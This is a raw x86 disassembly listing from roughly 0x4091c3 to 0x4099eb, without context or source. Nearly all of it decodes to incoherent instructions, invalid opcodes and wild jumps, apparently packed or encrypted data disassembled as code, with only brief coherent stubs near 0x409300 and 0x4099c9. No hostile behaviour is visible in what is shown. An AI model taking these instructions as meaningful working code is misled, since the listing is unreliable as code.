  4091c3:	std    
  4091c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c5:	mov    al,ds:0xe2dee857
  4091ca:	mov    al,ds:0xa664b1e0
  4091cf:	inc    esp
  4091d0:	xor    BYTE PTR [ecx-0x70c1d969],bh
  4091d6:	sbb    eax,0xeb155bae
  4091db:	inc    esi
  4091dc:	cmc    
  4091dd:	jne    0x4091fd
  4091df:	cs add al,0x5e
  4091e2:	or     eax,0x8f501e91
  4091e7:	in     eax,dx
  4091e8:	fisubr DWORD PTR [edx-0x2e8e6b94]
  4091ee:	push   ds
  4091ef:	cmc    
  4091f0:	pop    ebx
  4091f1:	cld    
  4091f2:	leave  
  4091f3:	jmp    0x409222
  4091f5:	xor    BYTE PTR [edx+0x366fb19d],cl
  4091fb:	xor    DWORD PTR [edx-0x70ea389],ebx
  409201:	ds mov esi,0xb51d7109
  409207:	mov    ch,0x84
  409209:	dec    ebx
  40920a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920b:	mov    WORD PTR [ebp+0x2962cce5],?
  409211:	dec    ecx
  409212:	out    dx,al
  409213:	mov    es,WORD PTR [edi]
  409215:	inc    bx
  409217:	lods   eax,DWORD PTR ds:[esi]
  409218:	and    ecx,DWORD PTR ds:0xbc824025
  40921e:	mov    dh,0xea
  409220:	and    DWORD PTR [edx+0x4f],esp
  409223:	adc    eax,DWORD PTR [edx+0x746f5e8a]
  409229:	inc    dx
  40922b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40922d:	push   edi
  40922e:	sub    eax,0xe865b7bf
  409233:	ins    BYTE PTR es:[edi],dx
  409234:	stc    
  409235:	stos   DWORD PTR es:[edi],eax
  409236:	inc    edi
  409237:	xchg   ebp,eax
  409238:	dec    DWORD PTR [ecx+ebx*1+0xa]
  40923c:	in     al,0x3b
  40923e:	and    al,0xf7
  409240:	mov    edx,0x9bd1005e
  409245:	xchg   ecx,eax
  409246:	mov    esp,0x48bdc317
  40924b:	mov    cl,0x83
  40924d:	or     edi,0x80016109
  409253:	(bad)  
  409254:	cld    
  409255:	in     eax,0xbc
  409257:	adc    DWORD PTR [esi+0x47a9c3df],esp
  40925d:	mov    esp,0xd060c2
  409262:	sub    eax,0x8baad0a9
  409267:	mov    ecx,0x7d85f4c4
  40926c:	fidivr DWORD PTR [eax]
  40926e:	pushf  
  40926f:	pop    edx
  409270:	fnsave [ebp+ebp*1-0x5288ad25]
  409277:	imul   edi,DWORD PTR [eax-0x70],0x68
  40927b:	inc    eax
  40927c:	or     eax,esi
  40927e:	fdivr  DWORD PTR [eax+ecx*8-0x7e159d2]
  409285:	or     BYTE PTR [edx+0x3b6c6859],dl
  40928b:	push   ebp
  40928c:	xchg   ebx,eax
  40928d:	sbb    DWORD PTR [eax],esi
  40928f:	and    ebx,DWORD PTR [ebp-0x77]
  409292:	icebp  
  409293:	inc    eax
  409294:	mov    dh,0x34
  409296:	or     BYTE PTR [ecx+0x7828b239],al
  40929c:	imul   edx,edi,0x73
  40929f:	pushf  
  4092a0:	out    dx,eax
  4092a1:	cli    
  4092a2:	xor    edx,DWORD PTR [edi]
  4092a4:	stos   DWORD PTR es:[edi],eax
  4092a5:	xchg   ebp,eax
  4092a6:	push   0xffffff92
  4092a8:	xchg   edx,eax
  4092a9:	or     dh,bl
  4092ab:	dec    ecx
  4092ac:	adc    edx,DWORD PTR [edi+0x327688d1]
  4092b2:	gs xchg ebp,eax
  4092b4:	push   ds
  4092b5:	mov    eax,ds:0x14969af3
  4092ba:	pop    esi
  4092bb:	ret    0x74df
  4092be:	pop    DWORD PTR [ebx]
  4092c0:	popa   
  4092c1:	test   eax,0xf8faf89e
  4092c6:	pop    edx
  4092c7:	scas   eax,DWORD PTR es:[edi]
  4092c8:	cmp    cl,bl
  4092ca:	test   eax,0xaab675e5
  4092cf:	and    ebx,DWORD PTR [ebp-0x6676a5a9]
  4092d5:	cdq    
  4092d6:	(bad)  
  4092d7:	and    DWORD PTR [edx+edi*4],esp
  4092da:	pop    ebx
  4092db:	add    eax,0x552e8d93
  4092e0:	fsubr  DWORD PTR [ebp-0x576ef858]
  4092e6:	pop    edi
  4092e7:	fld    DWORD PTR [ecx+ecx*8+0x4ad36096]
  4092ee:	mov    ?,WORD PTR [eax-0x5cf5eb7f]
  4092f4:	ret    0x372a
  4092f7:	fbld   TBYTE PTR [edi-0x6fb8f44d]
  4092fd:	sub    BYTE PTR [ebx+edi*4],al
  409300:	dec    ebx
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	add    ecx,DWORD PTR [ebx]
  40932f:	pop    edx
  409330:	ds daa 
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409380
  40933a:	pop    ebx
  40933b:	fsubr  QWORD PTR [eax]
  40933d:	pop    edi
  40933e:	out    dx,al
  40933f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409340:	aam    0x29
  409342:	(bad)  
  409343:	push   es
  409344:	(bad)  
  409345:	in     eax,0xb7
  409347:	popa   
  409348:	sbb    DWORD PTR [ecx],ecx
  40934a:	inc    eax
  40934b:	fisubr WORD PTR [edi-0x40]
  40934e:	jmp    0x40936b
  409350:	rcl    BYTE PTR [eax],0x2d
  409353:	jbe    0x409341
  409355:	(bad)  
  409356:	xchg   esi,eax
  409357:	mov    al,ds:0xe40a62f5
  40935c:	inc    eax
  40935d:	push   0xf
  40935f:	scas   eax,DWORD PTR es:[edi]
  409360:	mov    al,ds:0x14b6d100
  409365:	adc    BYTE PTR [esi-0x386939c4],bh
  40936b:	adc    DWORD PTR [ebx-0xd4d0d5b],edi
  409371:	cli    
  409372:	cld    
  409373:	adc    eax,0x47cc2600
  409378:	dec    esp
  409379:	scas   al,BYTE PTR es:[edi]
  40937a:	out    0x68,eax
  40937c:	mov    esi,0xb312723c
  409381:	mov    al,0x2e
  409383:	jae    0x4093ba
  409385:	test   BYTE PTR [edx-0xd],al
  409388:	jg     0x409312
  40938a:	mov    eax,ds:0xbae444a4
  40938f:	or     al,0x4b
  409391:	xor    al,0x44
  409393:	pop    edx
  409394:	rol    ah,1
  409396:	jmp    0xb5d46c81
  40939b:	and    ch,ch
  40939d:	and    BYTE PTR [ebp-0x60a4ee72],ah
  4093a3:	sub    edi,esp
  4093a5:	loop   0x4093fc
  4093a7:	sahf   
  4093a8:	fsubr  st,st(1)
  4093aa:	(bad)  
  4093ab:	(bad)  [edx]
  4093ad:	in     eax,0x1
  4093af:	pushf  
  4093b0:	inc    esp
  4093b1:	inc    ebp
  4093b2:	pop    edi
  4093b3:	das    
  4093b4:	cmc    
  4093b5:	mov    edi,0xa0c571f0
  4093ba:	sbb    DWORD PTR [edi-0x2ab506b2],0x51fd4980
  4093c4:	in     al,0x86
  4093c6:	pusha  
  4093c7:	sub    eax,edi
  4093c9:	or     ecx,DWORD PTR [edx+0x12770631]
  4093cf:	cmp    DWORD PTR [ebp-0x4f411bd7],edi
  4093d5:	fbstp  TBYTE PTR [edi-0x1d35ac43]
  4093db:	jle    0x4093f5
  4093dd:	jge    0x40943b
  4093df:	clc    
  4093e0:	(bad)  
  4093e1:	adc    dh,BYTE PTR [esi]
  4093e3:	ins    BYTE PTR es:[edi],dx
  4093e4:	rcl    dl,0x3b
  4093e7:	pop    eax
  4093e8:	and    eax,0xe021134a
  4093ed:	int3   
  4093ee:	addr16 ret 0x3bed
  4093f2:	xor    DWORD PTR [ebp+0x6],edi
  4093f5:	and    eax,DWORD PTR [edx]
  4093f7:	xchg   esi,eax
  4093f8:	ror    DWORD PTR [esi],cl
  4093fa:	sub    BYTE PTR ds:0xb6577833,0x7f
  409401:	mov    edi,0xcb1ba031
  409406:	sbb    BYTE PTR [ecx+0x68],bh
  409409:	push   ebx
  40940a:	je     0x4093c0
  40940c:	out    0xeb,al
  40940e:	out    dx,eax
  40940f:	add    eax,0x9ba702df
  409414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409415:	cwde   
  409416:	and    DWORD PTR [ebx],0xed6b3054
  40941c:	iret   
  40941d:	out    dx,al
  40941e:	pop    ebx
  40941f:	jno    0x409481
  409421:	(bad)  
  409422:	scas   eax,DWORD PTR es:[edi]
  409423:	mov    edi,0x954a4ee2
  409428:	test   ch,dl
  40942a:	imul   ebx,DWORD PTR [ebp-0x3e508a67],0x8bb21576
  409434:	add    DWORD PTR [eax+ecx*8-0x4a],esi
  409438:	ficom  WORD PTR [edx-0x72]
  40943b:	rcl    edx,cl
  40943d:	sar    dh,cl
  40943f:	cmp    al,0xe0
  409441:	jne    0x4093db
  409443:	sti    
  409444:	out    0xff,eax
  409446:	rol    DWORD PTR [edx+0x69],cl
  409449:	mov    ecx,0xf11bc4a6
  40944e:	mov    eax,0xcf206516
  409453:	ins    DWORD PTR es:[edi],dx
  409454:	jmp    0x409478
  409456:	mov    ebx,0x6f677a67
  40945b:	loopne 0x409459
  40945d:	cmp    al,0xaf
  40945f:	adc    al,BYTE PTR ds:0x5e24f66a
  409465:	cli    
  409466:	data16 mov cl,0x88
  409469:	iret   
  40946a:	or     ebp,ebp
  40946c:	xchg   edx,eax
  40946d:	sub    eax,0x52bde2a
  409472:	dec    ebp
  409473:	sti    
  409474:	pop    eax
  409475:	stos   DWORD PTR es:[edi],eax
  409476:	sbb    esp,DWORD PTR [edi-0x51]
  409479:	fisub  WORD PTR [edi-0x61]
  40947c:	aad    0x9a
  40947e:	mov    ebx,0x271f9ef9
  409483:	jl     0x409499
  409485:	in     al,dx
  409486:	cmp    eax,DWORD PTR [eax]
  409488:	adc    al,0x25
  40948a:	dec    ebx
  40948b:	dec    ebx
  40948c:	mov    esp,0xa1c2f91d
  409491:	repnz cli 
  409493:	sub    eax,0xc4c54e00
  409498:	leave  
  409499:	jns    0x4094af
  40949b:	adc    BYTE PTR [esi+eax*1],al
  40949e:	je     0x4094df
  4094a0:	sar    cl,1
  4094a2:	cmp    DWORD PTR [ebp-0x5d],0x9c0ca053
  4094a9:	jle    0x40942d
  4094ab:	mov    bl,0x2d
  4094ad:	aam    0xbe
  4094af:	in     eax,dx
  4094b0:	mov    al,0x9a
  4094b2:	add    BYTE PTR [ebx+0x70d49546],cl
  4094b8:	(bad)  
  4094b9:	jnp    0x4094d8
  4094bb:	pop    ebp
  4094bc:	and    al,0xe7
  4094be:	loop   0x4094e3
  4094c0:	xchg   sp,ax
  4094c2:	ss inc ebp
  4094c4:	mov    DWORD PTR [ebp-0x2d],0xe3acfdfd
  4094cb:	and    al,0xbd
  4094cd:	cmp    eax,0xc43018d7
  4094d2:	push   ebx
  4094d3:	sahf   
  4094d4:	jp     0x4094df
  4094d6:	dec    eax
  4094d7:	mov    dh,0x57
  4094d9:	mov    DWORD PTR ds:0xd21b98f3,0xd2ddfd1f
  4094e3:	xor    esi,esi
  4094e5:	jmp    0x7d4f:0x655000a7
  4094ec:	je     0x409494
  4094ee:	jnp    0x4094fa
  4094f0:	add    edi,esi
  4094f2:	add    eax,0x5dce39ed
  4094f7:	test   ebp,esp
  4094f9:	cmp    BYTE PTR [ebp-0xe],0xff
  4094fd:	push   edx
  4094fe:	inc    esi
  4094ff:	les    eax,FWORD PTR [esi+0x3d6a9488]
  409505:	add    BYTE PTR [edx],bh
  409507:	ja     0x409570
  409509:	pop    ds
  40950a:	loope  0x409527
  40950c:	inc    ebx
  40950d:	cmp    edi,DWORD PTR [ecx-0x1af4e814]
  409513:	out    dx,al
  409514:	(bad)  
  409515:	mov    ebp,0x1583d5aa
  40951a:	aad    0xd4
  40951c:	stos   BYTE PTR es:[edi],al
  40951d:	sbb    edi,edx
  40951f:	in     eax,dx
  409520:	iret   
  409521:	dec    eax
  409522:	xchg   esp,eax
  409523:	out    dx,eax
  409524:	clc    
  409525:	jle    0x4094ca
  409527:	loopne 0x4094b2
  409529:	in     al,dx
  40952a:	loopne 0x409529
  40952c:	les    edi,FWORD PTR [ecx]
  40952e:	cs js  0x4094ff
  409531:	cwde   
  409532:	jmp    0x409500
  409534:	and    eax,0x18a5d836
  409539:	xor    BYTE PTR [edx-0x45],0x65
  40953d:	push   0x6d29987f
  409542:	xor    dh,BYTE PTR [ecx+0x45a54a5d]
  409548:	fcmovb st,st(7)
  40954a:	sub    DWORD PTR [ecx],ebp
  40954c:	or     esp,ebx
  40954e:	add    esi,ebp
  409550:	pushf  
  409551:	clc    
  409552:	jge    0x4095b7
  409554:	(bad)  
  409555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409556:	popf   
  409557:	sub    ebp,esp
  409559:	and    BYTE PTR [eax],bl
  40955b:	fild   WORD PTR [esi-0x773a72b7]
  409561:	out    0x7e,eax
  409563:	popa   
  409564:	xor    eax,0xada1f5f8
  409569:	das    
  40956a:	push   0xb2996583
  40956f:	jmp    0xd28f:0x70ff898
  409576:	sub    bl,dh
  409578:	das    
  409579:	out    dx,al
  40957a:	add    al,0xf8
  40957c:	inc    esp
  40957d:	jl     0x409593
  40957f:	jbe    0x4095b0
  409581:	cli    
  409582:	ins    BYTE PTR es:[edi],dx
  409583:	sbb    edx,esp
  409585:	jno    0x40954a
  409587:	icebp  
  409588:	ds lock mov edx,0x251caa01
  40958f:	push   es
  409590:	add    eax,DWORD PTR [ecx+0x9]
  409593:	jge    0x4095cb
  409595:	fs dec esp
  409597:	and    dh,BYTE PTR [ebx+0x21c3a607]
  40959d:	add    al,0x9a
  40959f:	sahf   
  4095a0:	lock nop
  4095a2:	imul   ebp,DWORD PTR [edx],0x62
  4095a5:	daa    
  4095a6:	inc    esp
  4095a7:	jmp    0x75d1b093
  4095ac:	ds xchg ecx,eax
  4095ae:	inc    edi
  4095af:	mov    edi,0x1c05c5bd
  4095b4:	pop    ss
  4095b5:	stc    
  4095b6:	dec    eax
  4095b7:	mov    eax,ds:0x8bf4c1c8
  4095bc:	xchg   ebp,eax
  4095bd:	popa   
  4095be:	outs   dx,DWORD PTR ds:[esi]
  4095bf:	push   es
  4095c0:	add    eax,0x32f85b4
  4095c5:	jne    0x409556
  4095c7:	fbld   TBYTE PTR [edx+0x1843d859]
  4095cd:	jbe    0x409627
  4095cf:	data16 mov dh,0xb5
  4095d2:	push   ebx
  4095d3:	or     ch,BYTE PTR [eax+0x120c43a2]
  4095d9:	xor    al,BYTE PTR [edi-0x50]
  4095dc:	mov    BYTE PTR [ecx],ah
  4095de:	fwait
  4095df:	xchg   BYTE PTR [ecx],al
  4095e1:	cdq    
  4095e2:	jno    0x4095d3
  4095e4:	ja     0x4095bc
  4095e6:	inc    ecx
  4095e7:	jne    0x4095ba
  4095e9:	jmp    0xdac4:0x9877dac4
  4095f0:	loopne 0x409589
  4095f2:	call   0xfb54050d
  4095f7:	xchg   BYTE PTR [ebx+ebp*4-0x98bf3e7],ch
  4095fe:	pop    eax
  4095ff:	inc    edi
  409600:	sbb    BYTE PTR [ebx+0x48edefcd],0x76
  409607:	adc    bl,dh
  409609:	sub    al,0x51
  40960b:	adc    ebx,ebx
  40960d:	outs   dx,BYTE PTR ds:[esi]
  40960e:	sti    
  40960f:	xor    edx,edi
  409611:	cmc    
  409612:	int3   
  409613:	sahf   
  409614:	outs   dx,BYTE PTR cs:[esi]
  409616:	and    ebp,DWORD PTR [ebp+0x1d]
  409619:	cmp    BYTE PTR [ecx],cl
  40961b:	mov    eax,0x4a6b97ba
  409620:	xor    bh,dl
  409622:	loop   0x40963f
  409624:	mov    WORD PTR [edx+0x7],ss
  409627:	sub    BYTE PTR [edx+0x23493b8e],dh
  40962d:	push   ecx
  40962e:	adc    ecx,ebx
  409630:	sbb    DWORD PTR [ecx-0x11],esi
  409633:	or     bh,ah
  409635:	mov    ch,0x33
  409637:	jmp    0x4edd:0x8ea54345
  40963e:	or     edx,DWORD PTR [ebx+0x3c674fc2]
  409644:	mov    dl,BYTE PTR [ecx+esi*4+0x2a015343]
  40964b:	inc    ebx
  40964c:	je     0x40961a
  40964e:	out    0x2e,al
  409650:	jl     0x4095ec
  409652:	mov    al,0x20
  409654:	jae    0x409628
  409656:	sub    cl,ah
  409658:	push   0x5e91f132
  40965d:	cmp    al,bl
  40965f:	cs xchg esp,eax
  409661:	inc    ebp
  409662:	jmp    0x15973fd2
  409667:	(bad)  
  409668:	mov    al,ds:0x8b0150ff
  40966d:	inc    ebp
  40966e:	loopne 0x4095fb
  409670:	or     eax,0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [esi-0x288897c2],esi
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096d2
  409693:	cmp    BYTE PTR [eax-0x1],al
  409696:	hlt    
  409697:	jecxz  0x409644
  409699:	ja     0x4096ce
  40969b:	popa   
  40969c:	jg     0x409637
  40969e:	test   al,0x38
  4096a0:	pushf  
  4096a1:	clc    
  4096a2:	cs push es
  4096a4:	push   ss
  4096a5:	jmp    0xa73916a6
  4096aa:	mov    WORD PTR [ecx],ds
  4096ac:	cld    
  4096ad:	sbb    ebp,ecx
  4096af:	dec    edi
  4096b0:	mov    ds:0x16382eaa,al
  4096b5:	jns    0x40969b
  4096b7:	and    al,0x3d
  4096b9:	lea    ebx,[edx-0x162443dc]
  4096bf:	xor    BYTE PTR [edi-0x67543b3b],bl
  4096c5:	in     eax,dx
  4096c6:	sbb    DWORD PTR [ebp+edx*4-0x6d],ebp
  4096ca:	mov    ebx,0xb4d8e39e
  4096cf:	lods   eax,DWORD PTR ds:[esi]
  4096d0:	fimul  WORD PTR [edi-0x4c]
  4096d3:	jae    0x4096a4
  4096d5:	into   
  4096d6:	inc    esi
  4096d7:	xchg   ecx,eax
  4096d8:	jl     0x40968c
  4096da:	out    dx,al
  4096db:	imul   ecx,DWORD PTR [esi-0x5a302c7e],0xeac43ba2
  4096e5:	adc    al,0x7e
  4096e7:	mov    ds:0x80916e53,al
  4096ec:	sbb    ah,dl
  4096ee:	es dec eax
  4096f0:	sub    eax,DWORD PTR ds:0x773cf41
  4096f6:	or     esp,ebx
  4096f8:	dec    esi
  4096f9:	xor    BYTE PTR [ebp-0x5d],al
  4096fc:	inc    ebx
  4096fd:	daa    
  4096fe:	jns    0x40973a
  409700:	mov    esi,0x92279de3
  409705:	outs   dx,DWORD PTR ds:[esi]
  409706:	aas    
  409707:	pop    edi
  409708:	aas    
  409709:	push   0xffffffb0
  40970b:	push   ebx
  40970c:	hlt    
  40970d:	ins    BYTE PTR es:[edi],dx
  40970e:	repnz mov esp,esi
  409711:	sbb    ecx,DWORD PTR [eax+eax*4-0x2c]
  409715:	pop    ds
  409716:	xchg   ecx,eax
  409717:	loop   0x4096ed
  409719:	daa    
  40971a:	pusha  
  40971b:	ret    0x5be1
  40971e:	je     0x409754
  409720:	jge    0x409726
  409722:	add    al,0xba
  409724:	xor    al,0xb1
  409726:	rol    BYTE PTR [esp+ecx*8-0x21],1
  40972a:	push   es
  40972b:	xchg   esi,eax
  40972c:	out    0x75,al
  40972e:	repz ret 0xd061
  409732:	dec    edx
  409733:	adc    DWORD PTR [ebp+0x1f9bf821],0xf8a6dae7
  40973d:	popf   
  40973e:	sbb    BYTE PTR [edx+0x42b104bb],0xea
  409745:	cmp    esp,DWORD PTR [ebp-0x24beaa70]
  40974b:	into   
  40974c:	pop    ebp
  40974d:	jg     0x4096db
  40974f:	mov    fs,WORD PTR [edx+0x6e]
  409752:	sti    
  409753:	mov    bh,0x8
  409755:	enter  0xf7e8,0x2f
  409759:	mov    cl,0x10
  40975b:	dec    eax
  40975c:	xor    eax,0xea7bb926
  409761:	icebp  
  409762:	aad    0x9d
  409764:	inc    esi
  409765:	add    bl,BYTE PTR [edx-0x30]
  409768:	push   es
  409769:	adc    BYTE PTR ds:0x1778bc50,0x94
  409770:	jnp    0x40978b
  409772:	and    BYTE PTR [ebx],ch
  409774:	arpl   WORD PTR [ecx+0x3f],bp
  409777:	aaa    
  409778:	pop    esp
  40977a:	pop    ecx
  40977b:	dec    ebx
  40977c:	loope  0x409725
  40977e:	stos   BYTE PTR es:[edi],al
  40977f:	jnp    0x409784
  409781:	pop    esi
  409782:	jo     0x4097d4
  409784:	jp     0x4097cf
  409786:	cmp    eax,0x52d58a77
  40978b:	cmc    
  40978c:	aam    0xf8
  40978e:	cmp    BYTE PTR [edi+eax*1-0x5c01476a],bl
  409795:	leave  
  409796:	sub    DWORD PTR [esi],edx
  409798:	retf   0xb1bb
  40979b:	stos   BYTE PTR es:[edi],al
  40979c:	jl     0x409769
  40979e:	inc    ebp
  40979f:	aaa    
  4097a0:	mov    ebx,0xb7247a3d
  4097a5:	fs icebp 
  4097a7:	or     BYTE PTR [ebp-0x3e],ch
  4097aa:	out    dx,al
  4097ab:	jae    0x4097d8
  4097ad:	xchg   esp,eax
  4097ae:	ror    BYTE PTR [eax+0x6c],1
  4097b1:	adc    al,0xf1
  4097b3:	or     ebp,DWORD PTR [ebx-0x2c]
  4097b6:	dec    ebx
  4097b7:	ficomp DWORD PTR [eax+0x3e]
  4097ba:	jmp    0xef62:0xf4bbfe15
  4097c1:	(bad)  
  4097c2:	mov    ebx,0x31134308
  4097c7:	dec    ebx
  4097c8:	xchg   edi,eax
  4097c9:	pusha  
  4097ca:	fld    TBYTE PTR [esi]
  4097cc:	addr16 inc edi
  4097ce:	cmp    al,0xb9
  4097d0:	jmp    0x40976a
  4097d2:	sbb    eax,0xe172facb
  4097d7:	push   eax
  4097d8:	sub    bl,BYTE PTR [edx-0x3c]
  4097db:	push   ebp
  4097dc:	dec    esp
  4097dd:	ja     0x4097eb
  4097df:	mov    eax,0xac05c803
  4097e4:	(bad)  
  4097e5:	out    0x34,al
  4097e7:	mov    dl,ah
  4097e9:	add    al,0x59
  4097eb:	jbe    0x4097d3
  4097ed:	into   
  4097ee:	int    0x9e
  4097f0:	lock xlat BYTE PTR ds:[ebx]
  4097f2:	fwait
  4097f3:	imul   esp,DWORD PTR [ecx],0xffffffba
  4097f6:	out    0xb,eax
  4097f8:	push   esi
  4097f9:	imul   esp,DWORD PTR [eax-0x7e],0xdc825ee6
  409800:	xchg   DWORD PTR [edi],edi
  409802:	mov    bl,0x8
  409804:	jmp    FWORD PTR [ebx-0x42]
  409807:	nop
  409808:	pop    sp
  40980a:	pushf  
  40980b:	es daa 
  40980d:	into   
  40980e:	add    al,0x3f
  409810:	pop    ebp
  409811:	pop    ds
  409812:	ds or  eax,0xd30855e1
  409818:	sbb    esi,DWORD PTR [eax]
  40981a:	repz test eax,0x601c5caf
  409820:	mov    ah,0xea
  409822:	push   ds
  409823:	and    DWORD PTR [eax-0x4],eax
  409826:	ret    0x8d7c
  409829:	bound  ebx,QWORD PTR [edx-0x29afc5e6]
  40982f:	sbb    eax,0xfe70cb57
  409834:	fistp  WORD PTR [edi+0x1dcf1189]
  40983a:	inc    edx
  40983b:	pop    ds
  40983c:	mov    dh,0x46
  40983e:	lock add al,0xa5
  409841:	or     al,ah
  409843:	(bad)
  409847:	jae    0x4098c4
  409849:	rcr    BYTE PTR [ebp+eiz*1+0x77],0x6c
  40984e:	jg     0x40983a
  409850:	and    eax,0x343372b3
  409855:	pop    es
  409856:	lar    edx,WORD PTR [ecx-0x7a65df4f]
  40985d:	outs   dx,BYTE PTR ds:[esi]
  40985e:	mov    eax,ds:0x600664ae
  409863:	cmp    eax,0x2ebc0ccd
  409868:	xchg   ebx,eax
  409869:	fiadd  WORD PTR [ebx-0x76]
  40986c:	jns    0x409836
  40986e:	dec    ecx
  40986f:	sub    DWORD PTR [esi-0x3f],edx
  409872:	and    BYTE PTR [ebx+0x6a],0x70
  409876:	mov    bh,0x52
  409878:	or     cl,BYTE PTR [edi]
  40987a:	xor    eax,DWORD PTR [edx]
  40987c:	inc    ebp
  40987d:	leave  
  40987e:	mov    esp,0xca71db52
  409883:	xchg   esp,eax
  409884:	mov    bh,0xd5
  409886:	jp     0x4098f8
  409888:	leave  
  409889:	mov    dl,0xe4
  40988b:	test   BYTE PTR [edx-0x21],dl
  40988e:	pop    ebx
  40988f:	sbb    al,0x79
  409891:	pop    ebp
  409892:	fwait
  409893:	pop    ecx
  409894:	(bad)  
  409895:	iret   
  409896:	jle    0x40986d
  409898:	shr    DWORD PTR [ebp-0x32],1
  40989b:	std    
  40989c:	sub    dh,dl
  40989e:	and    eax,0x587f31cd
  4098a3:	loopne 0x4098e3
  4098a5:	dec    esp
  4098a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098a7:	pusha  
  4098a8:	dec    esp
  4098a9:	inc    ebp
  4098aa:	jnp    0x40989e
  4098ac:	fsub   st,st(3)
  4098ae:	push   esp
  4098af:	inc    ebx
  4098b0:	rol    BYTE PTR [ebx],0xd7
  4098b3:	(bad)  
  4098b4:	mov    esp,0xcac73851
  4098b9:	mov    esp,0xf346bdea
  4098be:	jo     0x40987a
  4098c0:	mov    ebx,0xcbdb4ff0
  4098c5:	pop    esi
  4098c6:	pop    esi
  4098c7:	fiadd  DWORD PTR ds:0x23ddd131
  4098cd:	adc    eax,0x1fffb30b
  4098d2:	dec    edx
  4098d3:	inc    eax
  4098d4:	or     BYTE PTR [edx-0x1b],cl
  4098d7:	or     DWORD PTR [edx+0x57],ecx
  4098da:	mov    ebp,0xa5a4d426
  4098df:	cmp    DWORD PTR [ebp-0x54],0xa4cb4d44
  4098e6:	mov    bl,0xdc
  4098e8:	fcmove st,st(1)
  4098ea:	call   0xf84da426
  4098ef:	pop    ecx
  4098f0:	scas   al,BYTE PTR es:[edi]
  4098f1:	js     0x409965
  4098f3:	clc    
  4098f4:	sub    cl,BYTE PTR [edi-0x9]
  4098f7:	inc    ebx
  4098f8:	mov    dl,0x68
  4098fa:	sbb    eax,0x22eb6281
  4098ff:	out    dx,eax
  409900:	mov    ebp,0x4b5138eb
  409905:	cmp    dl,al
  409907:	sbb    DWORD PTR ds:0xf34389de,esi
  40990d:	(bad)  
  40990e:	icebp  
  40990f:	iret   
  409910:	sub    al,0xc2
  409912:	mov    al,0xcc
  409914:	repnz add BYTE PTR [esi],ch
  409917:	outs   dx,DWORD PTR ds:[esi]
  409918:	jmp    0x409935
  40991a:	xchg   esp,eax
  40991b:	jecxz  0x40994a
  40991d:	add    eax,0x874dac7a
  409922:	lods   al,BYTE PTR ds:[esi]
  409923:	arpl   WORD PTR [ebp+0x1a6d7a55],si
  409929:	push   ss
  40992a:	cmp    DWORD PTR [esi],esi
  40992c:	pop    es
  40992d:	dec    ebx
  40992e:	sbb    edx,DWORD PTR [eax+edx*2-0x32c8249f]
  409935:	pop    ds
  409936:	loop   0x4099b7
  409938:	mov    eax,eax
  40993a:	repz mov esp,0x272d90cb
  409940:	add    al,0x98
  409942:	(bad)  
  409943:	test   eax,0x5ea0e898
  409948:	cmp    BYTE PTR [ebx],0x7d
  40994b:	mov    esp,0x27661d7a
  409950:	adc    DWORD PTR [eax+0x64],ebp
  409953:	xchg   BYTE PTR [ebp+eax*4+0x20a3b81a],bl
  40995a:	div    esp
  40995c:	mov    bl,0xd4
  40995e:	sbb    ebx,ecx
  409960:	mul    eax
  409962:	jle    0x40998d
  409964:	data16 out 0xf0,al
  409967:	test   DWORD PTR [ecx+0x28197cab],eax
  40996d:	push   0xf9cc7b0a
  409972:	std    
  409973:	(bad)  
  409974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409975:	out    0x89,al
  409977:	outs   dx,BYTE PTR ds:[esi]
  409978:	(bad)  
  409979:	adc    dl,BYTE PTR [eax-0x48e9e64d]
  40997f:	fnstcw WORD PTR [edx+0x3d4a6bb8]
  409985:	mov    bh,0x87
  409987:	pop    ebp
  409988:	ret    0x728f
  40998b:	not    BYTE PTR [ebp-0x7f]
  40998e:	push   ss
  40998f:	and    eax,DWORD PTR [ebx]
  409991:	ror    BYTE PTR [esi-0x3e5cceb1],1
  409997:	mov    ebp,0xe8581d98
  40999c:	push   ebx
  40999d:	stc    
  40999e:	add    cl,BYTE PTR [ebp+0x308439f4]
  4099a4:	pop    eax
  4099a5:	add    ebx,ebx
  4099a7:	xor    BYTE PTR [edi+0x67eaf120],ch
  4099ad:	imul   BYTE PTR ds:0x1f909e1d
  4099b3:	aad    0xbf
  4099b5:	dec    esp
  4099b6:	sti    
  4099b7:	mov    edi,0xcc8737da
  4099bc:	push   ebp
  4099bd:	nop
  4099be:	ds stos BYTE PTR es:[edi],al
  4099c0:	jnp    0x4099db
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
